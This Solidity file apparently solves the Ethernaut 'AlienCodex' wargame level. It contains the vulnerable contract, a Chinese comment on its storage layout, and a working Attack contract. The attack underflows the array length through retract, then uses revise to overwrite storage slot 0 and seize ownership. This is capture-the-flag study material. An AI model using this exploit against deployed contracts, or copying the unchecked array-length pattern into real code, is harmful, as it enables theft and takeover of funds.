// SPDX-License-Identifier: MIT
pragma solidity ^0.5.0;

import "./helpers/Ownable-05.sol";

contract AlienCodex is Ownable {
    bool public contact;
    bytes32[] public codex;

    modifier contacted() {
        assert(contact);
        _;
    }

    function makeContact() public {
        contact = true;
    }

    function record(bytes32 _content) public contacted {
        codex.push(_content);
    }

    function retract() public contacted {
        codex.length--;
    }

    function revise(uint256 i, bytes32 _content) public contacted {
        codex[i] = _content;
    }
}

/**
    数组向上覆盖
    |   |   slot[0] 存的contact+owner
    |   |   slot[1] 存放的codex.length
    |   |
    |   |
    |   |
    |   |
    |   |   slot[keccak256(abi.encode(1))-1]  存放codex[0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff]
    |   |   slot[keccak256(abi.encode(1))] 开始存放codex[0]
    |   |
    先调用retract，使revise可以写入slot[keccak256(abi.encode(1))]上方的数据
*/
contract Attack {
    AlienCodex public alian;

    constructor(address _target) public {
        alian = AlienCodex(_target);
    }

    function attack() external returns(uint256){
        alian.makeContact();
        alian.retract();

        bytes32 origin = keccak256(abi.encode(1));
        uint256 pos = uint256(origin);

        uint256 repos = 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff-pos+1;
        bytes32 data = bytes32(uint256(uint160(msg.sender)));
        alian.revise(repos, data);
        return repos;
    }
}